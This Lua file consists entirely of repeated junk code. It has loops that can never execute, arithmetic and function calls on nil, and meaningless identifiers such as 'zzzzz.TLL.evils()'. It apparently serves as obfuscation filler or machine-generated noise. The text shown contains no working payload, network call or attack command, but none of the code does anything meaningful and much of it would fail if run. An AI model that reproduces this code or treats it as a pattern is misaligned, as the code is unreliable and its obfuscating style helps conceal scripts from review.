while (tg)do;local o={}if (o.o(o(o.o(o.oo))))then if (o.oo) then oo={} if (oo.o(oo.oo))then;o.o=(o.o(o.o.o(o.oo(oo.o(oo.oo(o.o.o(o.o(o,o)))))))) o={o.o,o.o,o.o,oo.o,oo.oo} p = (nil),(nil)*(nil) o.p = p,p,p,p oo.oo.o = (nil),(nil)..","..o.p..","..(nil)*(nil)/(nil)..",(nil)" _G = {oo.oo.o,_G,oo.oo.o} gg = {oo.oo.o,gg,oo.oo.o} end;end;end;end
while(nil)do;for i=i,i do;local i={}if(i.i)then;i.i=i.i(i)end;for ii=i.i,i.i,i.i do;local ii={}if(ii.i)then;ii.i=ii.i()end;for iii=i,ii.i,i do;local iii={}if(iii.i)then;iii.i=iii.i(i)end;for iiii=i,ii,iii.i do;local iiii={}if(iiii.i)then;iiii.i=iiii.i(i)end;local iiii={}if(iiii.i)then;iiii.i=(iiii|iii|ii|i)(i)end;end;local iii={}if(iii.i)then;iii.i=(true|iii|ii|i)(i)end;end;local ii={}if(ii.i)then;ii.i=(true|false|ii|i)(i)end;end;local i={}if(i.i)then;i.i=(true|false|nil|i)(i)end;return(true|false|nil)end;return;end
while true do if not cuk then if nil ~= nil then (-nil)((-nil)[nil] | nil | nil) local _ = {} _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _(-nil*nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil *1, 1 << nil), -nil} end local k = {} k[''] = k local t = (k)(k, l) t[1] = 1 end cuk = ya break end local xxx = {} local XX = {} local X = {} X.X = {} if xxx.data ~= nil then xxx.sel = xxx.data() end xxx = nil xxx.xxx[Z] = nil xxx.xxx[X] = nil xxx.xxx[i] = nil X.XXX = XX.Z() X.XXX = X.XXX:Z() X.X[B] = X[Z] local gaul = {} if gaul ~= nil then gaul = nil end local zzzzz = {} if zzzzz ~= zzzzz then zzzzz.myname = zzzzz.bydZ() zzzzz.fullnick = zzzzz.bydZ.NesiA() zzzzz.channel = zzzzz.WTKC.eSports() zzzzz.partner = zzzzz.TLL.evils() end end
while true do if not cuk then if nil ~= nil then (-nil)((-nil)[nil] | nil | nil) local _ = {} _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _(-nil*nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil *1, 1 << nil), -nil} end local k = {} k[''] = k local t = (k)(k, l) t[1] = 1 end cuk = ya break end local xxx = {} local XX = {} local X = {} X.X = {} if xxx.data ~= nil then xxx.sel = xxx.data() end xxx = nil xxx.xxx[Z] = nil xxx.xxx[X] = nil xxx.xxx[i] = nil X.XXX = XX.Z() X.XXX = X.XXX:Z() X.X[B] = X[Z] local gaul = {} if gaul ~= nil then gaul = nil end local zzzzz = {} if zzzzz ~= zzzzz then zzzzz.myname = zzzzz.bydZ() zzzzz.fullnick = zzzzz.bydZ.NesiA() zzzzz.channel = zzzzz.WTKC.eSports() zzzzz.partner = zzzzz.TLL.evils() end end
while true do if not cuk then if nil ~= nil then (-nil)((-nil)[nil] | nil | nil) local _ = {} _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _(-nil*nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil *1, 1 << nil), -nil} end local k = {} k[''] = k local t = (k)(k, l) t[1] = 1 end cuk = ya break end local xxx = {} local XX = {} local X = {} X.X = {} if xxx.data ~= nil then xxx.sel = xxx.data() end xxx = nil xxx.xxx[Z] = nil xxx.xxx[X] = nil xxx.xxx[i] = nil X.XXX = XX.Z() X.XXX = X.XXX:Z() X.X[B] = X[Z] local gaul = {} if gaul ~= nil then gaul = nil end local zzzzz = {} if zzzzz ~= zzzzz then zzzzz.myname = zzzzz.bydZ() zzzzz.fullnick = zzzzz.bydZ.NesiA() zzzzz.channel = zzzzz.WTKC.eSports() zzzzz.partner = zzzzz.TLL.evils() end end
while true do if not cuk then if nil ~= nil then (-nil)((-nil)[nil] | nil | nil) local _ = {} _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _(-nil*nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil *1, 1 << nil), -nil} end local k = {} k[''] = k local t = (k)(k, l) t[1] = 1 end cuk = ya break end local xxx = {} local XX = {} local X = {} X.X = {} if xxx.data ~= nil then xxx.sel = xxx.data() end xxx = nil xxx.xxx[Z] = nil xxx.xxx[X] = nil xxx.xxx[i] = nil X.XXX = XX.Z() X.XXX = X.XXX:Z() X.X[B] = X[Z] local gaul = {} if gaul ~= nil then gaul = nil end local zzzzz = {} if zzzzz ~= zzzzz then zzzzz.myname = zzzzz.bydZ() zzzzz.fullnick = zzzzz.bydZ.NesiA() zzzzz.channel = zzzzz.WTKC.eSports() zzzzz.partner = zzzzz.TLL.evils() end end
while true do if not cuk then if nil ~= nil then (-nil)((-nil)[nil] | nil | nil) local _ = {} _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _(-nil*nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil *1, 1 << nil), -nil} end local k = {} k[''] = k local t = (k)(k, l) t[1] = 1 end cuk = ya break end local xxx = {} local XX = {} local X = {} X.X = {} if xxx.data ~= nil then xxx.sel = xxx.data() end xxx = nil xxx.xxx[Z] = nil xxx.xxx[X] = nil xxx.xxx[i] = nil X.XXX = XX.Z() X.XXX = X.XXX:Z() X.X[B] = X[Z] local gaul = {} if gaul ~= nil then gaul = nil end local zzzzz = {} if zzzzz ~= zzzzz then zzzzz.myname = zzzzz.bydZ() zzzzz.fullnick = zzzzz.bydZ.NesiA() zzzzz.channel = zzzzz.WTKC.eSports() zzzzz.partner = zzzzz.TLL.evils() end end
while true do if not cuk then if nil ~= nil then (-nil)((-nil)[nil] | nil | nil) local _ = {} _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _(-nil*nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil *1, 1 << nil), -nil} end local k = {} k[''] = k local t = (k)(k, l) t[1] = 1 end cuk = ya break end local xxx = {} local XX = {} local X = {} X.X = {} if xxx.data ~= nil then xxx.sel = xxx.data() end xxx = nil xxx.xxx[Z] = nil xxx.xxx[X] = nil xxx.xxx[i] = nil X.XXX = XX.Z() X.XXX = X.XXX:Z() X.X[B] = X[Z] local gaul = {} if gaul ~= nil then gaul = nil end local zzzzz = {} if zzzzz ~= zzzzz then zzzzz.myname = zzzzz.bydZ() zzzzz.fullnick = zzzzz.bydZ.NesiA() zzzzz.channel = zzzzz.WTKC.eSports() zzzzz.partner = zzzzz.TLL.evils() end end
while true do if not cuk then if nil ~= nil then (-nil)((-nil)[nil] | nil | nil) local _ = {} _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _(-nil*nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil *1, 1 << nil), -nil} end local k = {} k[''] = k local t = (k)(k, l) t[1] = 1 end cuk = ya break end local xxx = {} local XX = {} local X = {} X.X = {} if xxx.data ~= nil then xxx.sel = xxx.data() end xxx = nil xxx.xxx[Z] = nil xxx.xxx[X] = nil xxx.xxx[i] = nil X.XXX = XX.Z() X.XXX = X.XXX:Z() X.X[B] = X[Z] local gaul = {} if gaul ~= nil then gaul = nil end local zzzzz = {} if zzzzz ~= zzzzz then zzzzz.myname = zzzzz.bydZ() zzzzz.fullnick = zzzzz.bydZ.NesiA() zzzzz.channel = zzzzz.WTKC.eSports() zzzzz.partner = zzzzz.TLL.evils() end end
while true do if not cuk then if nil ~= nil then (-nil)((-nil)[nil] | nil | nil) local _ = {} _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _(-nil*nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil *1, 1 << nil), -nil} end local k = {} k[''] = k local t = (k)(k, l) t[1] = 1 end cuk = ya break end local xxx = {} local XX = {} local X = {} X.X = {} if xxx.data ~= nil then xxx.sel = xxx.data() end xxx = nil xxx.xxx[Z] = nil xxx.xxx[X] = nil xxx.xxx[i] = nil X.XXX = XX.Z() X.XXX = X.XXX:Z() X.X[B] = X[Z] local gaul = {} if gaul ~= nil then gaul = nil end local zzzzz = {} if zzzzz ~= zzzzz then zzzzz.myname = zzzzz.bydZ() zzzzz.fullnick = zzzzz.bydZ.NesiA() zzzzz.channel = zzzzz.WTKC.eSports() zzzzz.partner = zzzzz.TLL.evils() end end
while true do if not cuk then if nil ~= nil then (-nil)((-nil)[nil] | nil | nil) local _ = {} _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _(-nil*nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil *1, 1 << nil), -nil} end local k = {} k[''] = k local t = (k)(k, l) t[1] = 1 end cuk = ya break end local xxx = {} local XX = {} local X = {} X.X = {} if xxx.data ~= nil then xxx.sel = xxx.data() end xxx = nil xxx.xxx[Z] = nil xxx.xxx[X] = nil xxx.xxx[i] = nil X.XXX = XX.Z() X.XXX = X.XXX:Z() X.X[B] = X[Z] local gaul = {} if gaul ~= nil then gaul = nil end local zzzzz = {} if zzzzz ~= zzzzz then zzzzz.myname = zzzzz.bydZ() zzzzz.fullnick = zzzzz.bydZ.NesiA() zzzzz.channel = zzzzz.WTKC.eSports() zzzzz.partner = zzzzz.TLL.evils() end end
for i in ipairs({}) do local xs = {} if not xs then else xs = ya local sssss = {} sssss.d = sssss.d() if sssss.d ~= sssss.d then sssss.d = sssss.d() end local sssss = {} sssss.clearResults = sssss.clearResults() if sssss.clearResults ~= sssss.clearResults then sssss.clearResults = sssss.clearResults() end end end
for i in ipairs({}) do local xs = {} if not xs then else xs = ya local sssss = {} sssss.g = sssss.g() if sssss.g ~= sssss.g then sssss.g = sssss.g() end local sssss = {} sssss.setRanges = sssss.setRanges() if sssss.setRanges ~= sssss.setRanges then sssss.setRanges = sssss.setRanges() end end end
while true do if not cuk then if nil ~= nil then (-nil)((-nil)[nil] | nil | nil) local _ = {} _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _(-nil*nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil *1, 1 << nil), -nil} end local k = {} k[''] = k local t = (k)(k, l) t[1] = 1 end cuk = ya break end local xxx = {} local XX = {} local X = {} X.X = {} if xxx.data ~= nil then xxx.sel = xxx.data() end xxx = nil xxx.xxx[Z] = nil xxx.xxx[X] = nil xxx.xxx[i] = nil X.XXX = XX.Z() X.XXX = X.XXX:Z() X.X[B] = X[Z] local gaul = {} if gaul ~= nil then gaul = nil end local zzzzz = {} if zzzzz ~= zzzzz then zzzzz.myname = zzzzz.bydZ() zzzzz.fullnick = zzzzz.bydZ.NesiA() zzzzz.channel = zzzzz.WTKC.eSports() zzzzz.partner = zzzzz.TLL.evils() end end
for i in ipairs({}) do local xs = {} if not xs then else xs = ya local sssss = {} sssss.d = sssss.d() if sssss.d ~= sssss.d then sssss.d = sssss.d() end local sssss = {} sssss.clearResults = sssss.clearResults() if sssss.clearResults ~= sssss.clearResults then sssss.clearResults = sssss.clearResults() end end end
for i in ipairs({}) do local xs = {} if not xs then else xs = ya local sssss = {} sssss.g = sssss.g() if sssss.g ~= sssss.g then sssss.g = sssss.g() end local sssss = {} sssss.setRanges = sssss.setRanges() if sssss.setRanges ~= sssss.setRanges then sssss.setRanges = sssss.setRanges() end end end
while true do if not cuk then if nil ~= nil then (-nil)((-nil)[nil] | nil | nil) local _ = {} _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _(-nil*nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil *1, 1 << nil), -nil} end local k = {} k[''] = k local t = (k)(k, l) t[1] = 1 end cuk = ya break end local xxx = {} local XX = {} local X = {} X.X = {} if xxx.data ~= nil then xxx.sel = xxx.data() end xxx = nil xxx.xxx[Z] = nil xxx.xxx[X] = nil xxx.xxx[i] = nil X.XXX = XX.Z() X.XXX = X.XXX:Z() X.X[B] = X[Z] local gaul = {} if gaul ~= nil then gaul = nil end local zzzzz = {} if zzzzz ~= zzzzz then zzzzz.myname = zzzzz.bydZ() zzzzz.fullnick = zzzzz.bydZ.NesiA() zzzzz.channel = zzzzz.WTKC.eSports() zzzzz.partner = zzzzz.TLL.evils() end end
for i in ipairs({}) do local xs = {} if not xs then else xs = ya local sssss = {} sssss.d = sssss.d() if sssss.d ~= sssss.d then sssss.d = sssss.d() end local sssss = {} sssss.clearResults = sssss.clearResults() if sssss.clearResults ~= sssss.clearResults then sssss.clearResults = sssss.clearResults() end end end
for i in ipairs({}) do local xs = {} if not xs then else xs = ya local sssss = {} sssss.g = sssss.g() if sssss.g ~= sssss.g then sssss.g = sssss.g() end local sssss = {} sssss.setRanges = sssss.setRanges() if sssss.setRanges ~= sssss.setRanges then sssss.setRanges = sssss.setRanges() end end end
while true do if not cuk then if nil ~= nil then (-nil)((-nil)[nil] | nil | nil) local _ = {} _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _(-nil*nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil *1, 1 << nil), -nil} end local k = {} k[''] = k local t = (k)(k, l) t[1] = 1 end cuk = ya break end local xxx = {} local XX = {} local X = {} X.X = {} if xxx.data ~= nil then xxx.sel = xxx.data() end xxx = nil xxx.xxx[Z] = nil xxx.xxx[X] = nil xxx.xxx[i] = nil X.XXX = XX.Z() X.XXX = X.XXX:Z() X.X[B] = X[Z] local gaul = {} if gaul ~= nil then gaul = nil end local zzzzz = {} if zzzzz ~= zzzzz then zzzzz.myname = zzzzz.bydZ() zzzzz.fullnick = zzzzz.bydZ.NesiA() zzzzz.channel = zzzzz.WTKC.eSports() zzzzz.partner = zzzzz.TLL.evils() end end
for i in ipairs({}) do local xs = {} if not xs then else xs = ya local sssss = {} sssss.d = sssss.d() if sssss.d ~= sssss.d then sssss.d = sssss.d() end local sssss = {} sssss.clearResults = sssss.clearResults() if sssss.clearResults ~= sssss.clearResults then sssss.clearResults = sssss.clearResults() end end end
for i in ipairs({}) do local xs = {} if not xs then else xs = ya local sssss = {} sssss.g = sssss.g() if sssss.g ~= sssss.g then sssss.g = sssss.g() end local sssss = {} sssss.setRanges = sssss.setRanges() if sssss.setRanges ~= sssss.setRanges then sssss.setRanges = sssss.setRanges() end end end
while true do if not cuk then if nil ~= nil then (-nil)((-nil)[nil] | nil | nil) local _ = {} _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _(-nil*nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil *1, 1 << nil), -nil} end local k = {} k[''] = k local t = (k)(k, l) t[1] = 1 end cuk = ya break end local xxx = {} local XX = {} local X = {} X.X = {} if xxx.data ~= nil then xxx.sel = xxx.data() end xxx = nil xxx.xxx[Z] = nil xxx.xxx[X] = nil xxx.xxx[i] = nil X.XXX = XX.Z() X.XXX = X.XXX:Z() X.X[B] = X[Z] local gaul = {} if gaul ~= nil then gaul = nil end local zzzzz = {} if zzzzz ~= zzzzz then zzzzz.myname = zzzzz.bydZ() zzzzz.fullnick = zzzzz.bydZ.NesiA() zzzzz.channel = zzzzz.WTKC.eSports() zzzzz.partner = zzzzz.TLL.evils() end end
for i in ipairs({}) do local xs = {} if not xs then else xs = ya local sssss = {} sssss.d = sssss.d() if sssss.d ~= sssss.d then sssss.d = sssss.d() end local sssss = {} sssss.clearResults = sssss.clearResults() if sssss.clearResults ~= sssss.clearResults then sssss.clearResults = sssss.clearResults() end end end
for i in ipairs({}) do local xs = {} if not xs then else xs = ya local sssss = {} sssss.g = sssss.g() if sssss.g ~= sssss.g then sssss.g = sssss.g() end local sssss = {} sssss.setRanges = sssss.setRanges() if sssss.setRanges ~= sssss.setRanges then sssss.setRanges = sssss.setRanges() end end end
while true do if not cuk then if nil ~= nil then (-nil)((-nil)[nil] | nil | nil) local _ = {} _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _(-nil*nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil *1, 1 << nil), -nil} end local k = {} k[''] = k local t = (k)(k, l) t[1] = 1 end cuk = ya break end local xxx = {} local XX = {} local X = {} X.X = {} if xxx.data ~= nil then xxx.sel = xxx.data() end xxx = nil xxx.xxx[Z] = nil xxx.xxx[X] = nil xxx.xxx[i] = nil X.XXX = XX.Z() X.XXX = X.XXX:Z() X.X[B] = X[Z] local gaul = {} if gaul ~= nil then gaul = nil end local zzzzz = {} if zzzzz ~= zzzzz then zzzzz.myname = zzzzz.bydZ() zzzzz.fullnick = zzzzz.bydZ.NesiA() zzzzz.channel = zzzzz.WTKC.eSports() zzzzz.partner = zzzzz.TLL.evils() end end
for i in ipairs({}) do local xs = {} if not xs then else xs = ya local sssss = {} sssss.d = sssss.d() if sssss.d ~= sssss.d then sssss.d = sssss.d() end local sssss = {} sssss.clearResults = sssss.clearResults() if sssss.clearResults ~= sssss.clearResults then sssss.clearResults = sssss.clearResults() end end end
for i in ipairs({}) do local xs = {} if not xs then else xs = ya local sssss = {} sssss.g = sssss.g() if sssss.g ~= sssss.g then sssss.g = sssss.g() end local sssss = {} sssss.setRanges = sssss.setRanges() if sssss.setRanges ~= sssss.setRanges then sssss.setRanges = sssss.setRanges() end end end
while true do if not cuk then if nil ~= nil then (-nil)((-nil)[nil] | nil | nil) local _ = {} _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _(-nil*nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil *1, 1 << nil), -nil} end local k = {} k[''] = k local t = (k)(k, l) t[1] = 1 end cuk = ya break end local xxx = {} local XX = {} local X = {} X.X = {} if xxx.data ~= nil then xxx.sel = xxx.data() end xxx = nil xxx.xxx[Z] = nil xxx.xxx[X] = nil xxx.xxx[i] = nil X.XXX = XX.Z() X.XXX = X.XXX:Z() X.X[B] = X[Z] local gaul = {} if gaul ~= nil then gaul = nil end local zzzzz = {} if zzzzz ~= zzzzz then zzzzz.myname = zzzzz.bydZ() zzzzz.fullnick = zzzzz.bydZ.NesiA() zzzzz.channel = zzzzz.WTKC.eSports() zzzzz.partner = zzzzz.TLL.evils() end end
for i in ipairs({}) do local xs = {} if not xs then else xs = ya local sssss = {} sssss.d = sssss.d() if sssss.d ~= sssss.d then sssss.d = sssss.d() end local sssss = {} sssss.clearResults = sssss.clearResults() if sssss.clearResults ~= sssss.clearResults then sssss.clearResults = sssss.clearResults() end end end
for i in ipairs({}) do local xs = {} if not xs then else xs = ya local sssss = {} sssss.g = sssss.g() if sssss.g ~= sssss.g then sssss.g = sssss.g() end local sssss = {} sssss.setRanges = sssss.setRanges() if sssss.setRanges ~= sssss.setRanges then sssss.setRanges = sssss.setRanges() end end end
while true do if not cuk then if nil ~= nil then (-nil)((-nil)[nil] | nil | nil) local _ = {} _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _(-nil*nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil *1, 1 << nil), -nil} end local k = {} k[''] = k local t = (k)(k, l) t[1] = 1 end cuk = ya break end local xxx = {} local XX = {} local X = {} X.X = {} if xxx.data ~= nil then xxx.sel = xxx.data() end xxx = nil xxx.xxx[Z] = nil xxx.xxx[X] = nil xxx.xxx[i] = nil X.XXX = XX.Z() X.XXX = X.XXX:Z() X.X[B] = X[Z] local gaul = {} if gaul ~= nil then gaul = nil end local zzzzz = {} if zzzzz ~= zzzzz then zzzzz.myname = zzzzz.bydZ() zzzzz.fullnick = zzzzz.bydZ.NesiA() zzzzz.channel = zzzzz.WTKC.eSports() zzzzz.partner = zzzzz.TLL.evils() end end
for i in ipairs({}) do local xs = {} if not xs then else xs = ya local sssss = {} sssss.d = sssss.d() if sssss.d ~= sssss.d then sssss.d = sssss.d() end local sssss = {} sssss.clearResults = sssss.clearResults() if sssss.clearResults ~= sssss.clearResults then sssss.clearResults = sssss.clearResults() end end end
for i in ipairs({}) do local xs = {} if not xs then else xs = ya local sssss = {} sssss.g = sssss.g() if sssss.g ~= sssss.g then sssss.g = sssss.g() end local sssss = {} sssss.setRanges = sssss.setRanges() if sssss.setRanges ~= sssss.setRanges then sssss.setRanges = sssss.setRanges() end end end
while true do if not cuk then if nil ~= nil then (-nil)((-nil)[nil] | nil | nil) local _ = {} _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _(-nil*nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil *1, 1 << nil), -nil} end local k = {} k[''] = k local t = (k)(k, l) t[1] = 1 end cuk = ya break end local xxx = {} local XX = {} local X = {} X.X = {} if xxx.data ~= nil then xxx.sel = xxx.data() end xxx = nil xxx.xxx[Z] = nil xxx.xxx[X] = nil xxx.xxx[i] = nil X.XXX = XX.Z() X.XXX = X.XXX:Z() X.X[B] = X[Z] local gaul = {} if gaul ~= nil then gaul = nil end local zzzzz = {} if zzzzz ~= zzzzz then zzzzz.myname = zzzzz.bydZ() zzzzz.fullnick = zzzzz.bydZ.NesiA() zzzzz.channel = zzzzz.WTKC.eSports() zzzzz.partner = zzzzz.TLL.evils() end end
for i in ipairs({}) do local xs = {} if not xs then else xs = ya local sssss = {} sssss.d = sssss.d() if sssss.d ~= sssss.d then sssss.d = sssss.d() end local sssss = {} sssss.clearResults = sssss.clearResults() if sssss.clearResults ~= sssss.clearResults then sssss.clearResults = sssss.clearResults() end end end
for i in ipairs({}) do local xs = {} if not xs then else xs = ya local sssss = {} sssss.g = sssss.g() if sssss.g ~= sssss.g then sssss.g = sssss.g() end local sssss = {} sssss.setRanges = sssss.setRanges() if sssss.setRanges ~= sssss.setRanges then sssss.setRanges = sssss.setRanges() end end end
while true do if not cuk then if nil ~= nil then (-nil)((-nil)[nil] | nil | nil) local _ = {} _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _(-nil*nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil *1, 1 << nil), -nil} end local k = {} k[''] = k local t = (k)(k, l) t[1] = 1 end cuk = ya break end local xxx = {} local XX = {} local X = {} X.X = {} if xxx.data ~= nil then xxx.sel = xxx.data() end xxx = nil xxx.xxx[Z] = nil xxx.xxx[X] = nil xxx.xxx[i] = nil X.XXX = XX.Z() X.XXX = X.XXX:Z() X.X[B] = X[Z] local gaul = {} if gaul ~= nil then gaul = nil end local zzzzz = {} if zzzzz ~= zzzzz then zzzzz.myname = zzzzz.bydZ() zzzzz.fullnick = zzzzz.bydZ.NesiA() zzzzz.channel = zzzzz.WTKC.eSports() zzzzz.partner = zzzzz.TLL.evils() end end
for i in ipairs({}) do local xs = {} if not xs then else xs = ya local sssss = {} sssss.d = sssss.d() if sssss.d ~= sssss.d then sssss.d = sssss.d() end local sssss = {} sssss.clearResults = sssss.clearResults() if sssss.clearResults ~= sssss.clearResults then sssss.clearResults = sssss.clearResults() end end end
for i in ipairs({}) do local xs = {} if not xs then else xs = ya local sssss = {} sssss.g = sssss.g() if sssss.g ~= sssss.g then sssss.g = sssss.g() end local sssss = {} sssss.setRanges = sssss.setRanges() if sssss.setRanges ~= sssss.setRanges then sssss.setRanges = sssss.setRanges() end end end
for i in ipairs({}) do local xs = {} if not xs then else xs = ya local sssss = {} sssss.d = sssss.d() if sssss.d ~= sssss.d then sssss.d = sssss.d() end local sssss = {} sssss.clearResults = sssss.clearResults() if sssss.clearResults ~= sssss.clearResults then sssss.clearResults = sssss.clearResults() end end end
for i in ipairs({}) do local xs = {} if not xs then else xs = ya local sssss = {} sssss.g = sssss.g() if sssss.g ~= sssss.g then sssss.g = sssss.g() end local sssss = {} sssss.setRanges = sssss.setRanges() if sssss.setRanges ~= sssss.setRanges then sssss.setRanges = sssss.setRanges() end end end
while(nil)do;local y={}if(y.y)then;y.y=(y.y(y))end;end
while(nil)do;for y=y,y do;local y={}if(y.y)then;y.y=y.y(y)end;for yy=y.y,y.y,y.y do;local yy={}if(yy.y)then;yy.y=yy.y()end;for yyy=y,yy.y,y do;local yyy={}if(yyy.y)then;yyy.y=yyy.y(y)end;for yyyy=y,yy,yyy.y do;local yyyy={}if(yyyy.y)then;yyyy.y=yyyy.y(y)end;local yyyy={}if(yyyy.y)then;yyyy.y=(yyyy|yyy|yy|y)(y)end;end;local yyy={}if(yyy.y)then;yyy.y=(true|yyy|yy|y)(y)end;end;local yy={}if(yy.y)then;yy.y=(true|false|yy|y)(y)end;end;local y={}if(y.y)then;y.y=(true|nil|false|nil|y|nil|false|true|nil)(y)end;return(true|false|nil)end;return;end
while(nil)do;local y={}if(y.y)then;y.y=(y.y(y))end;end
while(nil)do;for y=y,y do;local y={}if(y.y)then;y.y=y.y(y)end;for yy=y.y,y.y,y.y do;local yy={}if(yy.y)then;yy.y=yy.y()end;for yyy=y,yy.y,y do;local yyy={}if(yyy.y)then;yyy.y=yyy.y(y)end;for yyyy=y,yy,yyy.y do;local yyyy={}if(yyyy.y)then;yyyy.y=yyyy.y(y)end;local yyyy={}if(yyyy.y)then;yyyy.y=(yyyy|yyy|yy|y)(y)end;end;local yyy={}if(yyy.y)then;yyy.y=(true|yyy|yy|y)(y)end;end;local yy={}if(yy.y)then;yy.y=(true|false|yy|y)(y)end;end;local y={}if(y.y)then;y.y=(true|nil|false|nil|y|nil|false|true|nil)(y)end;return(true|false|nil)end;return;end
while(nil)do;local y={}if(y.y)then;y.y=(y.y(y))end;end
while(nil)do;for y=y,y do;local y={}if(y.y)then;y.y=y.y(y)end;for yy=y.y,y.y,y.y do;local yy={}if(yy.y)then;yy.y=yy.y()end;for yyy=y,yy.y,y do;local yyy={}if(yyy.y)then;yyy.y=yyy.y(y)end;for yyyy=y,yy,yyy.y do;local yyyy={}if(yyyy.y)then;yyyy.y=yyyy.y(y)end;local yyyy={}if(yyyy.y)then;yyyy.y=(yyyy|yyy|yy|y)(y)end;end;local yyy={}if(yyy.y)then;yyy.y=(true|yyy|yy|y)(y)end;end;local yy={}if(yy.y)then;yy.y=(true|false|yy|y)(y)end;end;local y={}if(y.y)then;y.y=(true|nil|false|nil|y|nil|false|true|nil)(y)end;return(true|false|nil)end;return;end
while(nil)do;local y={}if(y.y)then;y.y=(y.y(y))end;end
while(nil)do;for y=y,y do;local y={}if(y.y)then;y.y=y.y(y)end;for yy=y.y,y.y,y.y do;local yy={}if(yy.y)then;yy.y=yy.y()end;for yyy=y,yy.y,y do;local yyy={}if(yyy.y)then;yyy.y=yyy.y(y)end;for yyyy=y,yy,yyy.y do;local yyyy={}if(yyyy.y)then;yyyy.y=yyyy.y(y)end;local yyyy={}if(yyyy.y)then;yyyy.y=(yyyy|yyy|yy|y)(y)end;end;local yyy={}if(yyy.y)then;yyy.y=(true|yyy|yy|y)(y)end;end;local yy={}if(yy.y)then;yy.y=(true|false|yy|y)(y)end;end;local y={}if(y.y)then;y.y=(true|nil|false|nil|y|nil|false|true|nil)(y)end;return(true|false|nil)end;return;end
while(nil)do;local y={}if(y.y)then;y.y=(y.y(y))end;end
while(nil)do;for y=y,y do;local y={}if(y.y)then;y.y=y.y(y)end;for yy=y.y,y.y,y.y do;local yy={}if(yy.y)then;yy.y=yy.y()end;for yyy=y,yy.y,y do;local yyy={}if(yyy.y)then;yyy.y=yyy.y(y)end;for yyyy=y,yy,yyy.y do;local yyyy={}if(yyyy.y)then;yyyy.y=yyyy.y(y)end;local yyyy={}if(yyyy.y)then;yyyy.y=(yyyy|yyy|yy|y)(y)end;end;local yyy={}if(yyy.y)then;yyy.y=(true|yyy|yy|y)(y)end;end;local yy={}if(yy.y)then;yy.y=(true|false|yy|y)(y)end;end;local y={}if(y.y)then;y.y=(true|nil|false|nil|y|nil|false|true|nil)(y)end;return(true|false|nil)end;return;end
while(nil)do;local y={}if(y.y)then;y.y=(y.y(y))end;end
while(nil)do;for y=y,y do;local y={}if(y.y)then;y.y=y.y(y)end;for yy=y.y,y.y,y.y do;local yy={}if(yy.y)then;yy.y=yy.y()end;for yyy=y,yy.y,y do;local yyy={}if(yyy.y)then;yyy.y=yyy.y(y)end;for yyyy=y,yy,yyy.y do;local yyyy={}if(yyyy.y)then;yyyy.y=yyyy.y(y)end;local yyyy={}if(yyyy.y)then;yyyy.y=(yyyy|yyy|yy|y)(y)end;end;local
yyy={}if(yyy.y)then;yyy.y=(true|yyy|yy|y)(y)end;end;local yy={}if(yy.y)then;yy.y=(true|false|yy|y)(y)end;end;local y={}if(y.y)then;y.y=(true|nil|false|nil|y|nil|false|true|nil)(y)end;return(true|false|nil)end;return;end
while(nil)do;local y={}if(y.y)then;y.y=(y.y(y))end;end
